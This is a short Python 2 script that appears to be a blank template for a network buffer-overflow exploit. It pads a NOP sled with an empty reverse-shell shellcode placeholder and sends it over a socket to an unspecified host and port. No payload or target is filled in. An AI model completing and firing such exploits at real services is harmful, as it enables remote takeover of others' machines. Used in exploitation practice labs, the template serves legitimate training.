import sys, socket

rev_shell = ("")

shellcode = "A" * 0 + "" + "\x90" * 16 + rev_shell

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('', ))
	s.send('' + shellcode)
	s.close()

except:
	print "Error - no connection"
	sys.exit()
	
